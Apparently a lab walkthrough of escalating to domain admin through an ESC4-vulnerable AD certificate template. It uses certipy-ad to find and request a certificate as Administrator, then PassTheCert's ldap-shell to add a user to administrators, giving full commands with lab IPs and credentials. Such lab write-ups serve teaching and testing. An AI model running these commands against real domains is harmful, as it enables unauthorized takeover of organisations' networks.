
1. check User Joint Groups
```powershell
whoami /all
```
![Pasted image 20250609231308](https://github.com/user-attachments/assets/30e609e6-5ace-4afc-b2ac-03f42ca6d6e0)

2. Determine if it’s truly vulnerable Using `certipy-ad`
**Installing**
```shell
sudo apt install certipy-ad
```
If error indicates a conflict between two packages: `certipy-ad` and `python3-certipy`.
Do the follwoing
```shell
sudo apt remove python3-certipy
sudo apt install certipy-ad
```
3. We can use `certipy-ad` to check for vulnerabilities and retrieve the template locally, especially since we have the user credentials.
```shell
certipy-ad find -u <user> -p <password> -dc-ip <Domain-IP> -stdout -vulnerable
```
**Example**
```shell
certipy-ad find -u Jodie.Summers -p "hHO_S9gff7ehXw" -dc-ip 192.168.171.30 -stdout -vulnerable
```
![Pasted image 20250609231800](https://github.com/user-attachments/assets/28e835fd-7bde-4204-920c-fa91d945eae6)


![[Pasted image 20250609231845.png]]We can clearly see the message indicating that ESC4 has dangerous permissions.

Now time to exploit and get the `administrator` hash since we have gotten the template name let request to receive a certificate.
```shell
certipy-ad req -username <user> -p <password> -template <template-name> -dc-ip <Domain ip> -ca <CA Name> -upn <user@domain> -dns <DNS Name> -debug
```
**Example**
```shell
certipy-ad req -username "Jodie.Summers" -p "hHO_S9gff7ehXw" -template NaraUser -dc-ip 192.168.171.30 -ca NARA-CA -upn 'Administrator@nara-security.com' -dns Nara.nara-security.com -debug
```
![Pasted image 20250609232054](https://github.com/user-attachments/assets/5baf93c0-f65f-4bb2-85f9-4408423a7a45)


**Get the admin hash**
Typically at this point I would use the `auth` command to get the NTLM hash for the administrator user:
```shell
certipy-ad auth -pfx <PATH_TO_PFX_CERT> -domain <domain> -username <user> -dc-ip <Domain-ip>
```
**Example**
```shell
certipy-ad auth -pfx administrator_nara.pfx -domain nara-security.com -username administrator -dc-ip 192.168.171.30
```

![Pasted image 20250609233956](https://github.com/user-attachments/assets/12163e32-e8fd-4fb2-9a8f-e4926999cabc)

Unfortunately it doesn't work
> If you run into a situation where you can enroll in a vulnerable certificate template but the resulting certificate fails for Kerberos authentication, you can try authenticating to LDAP via SChannel using something like [PassTheCert](https://github.com/AlmondOffSec/PassTheCert). You will only have LDAP access, but this should be enough if you have a certificate stating you’re a domain admin.

To perform a PassTheCert attack, I’ll need the key and certificate in separate files, which `certipy` can handle:
```shell
certipy-ad cert -pfx <PATH_TO_PFX_CERT> -nocert -out <PEM_KEY>
certipy-ad cert -pfx <PATH_TO_PFX_CERT> -nokey -out <PEM_CERT>
```
**Example**
```shell
certipy-ad cert -pfx administrator_nara.pfx -nocert -out administrator.key
certipy-ad cert -pfx administrator_nara.pfx -nokey -out administrator.crt
```
Installed `PassTheCert`
**Download**
```shell
wget https://github.com/AlmondOffSec/PassTheCert/raw/refs/heads/main/Python/passthecert.py
```
It also offers an `ldap-shell` option that allows me to run a limited set of commands on the DC.
```shell
python passthecert.py -action ldap-shell -crt <Certificate.crt> -key <Certificate.key> -domain <domain> -dc-ip <domain-ip>
```
**Example**
```shell
python passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain nara-security.com -dc-ip 192.168.171.30
```
![Pasted image 20250610000300](https://github.com/user-attachments/assets/d30518f1-4c73-4b16-a0cd-10d1f4068b49)
```ldap
add_user_to_group <User> <Group>
```
**Example**
```ldap
add_user_to_group jodie.summers administrators
```
![Pasted image 20250610000340](https://github.com/user-attachments/assets/43c4c5dd-439b-43e5-b1f8-c0434f318424)

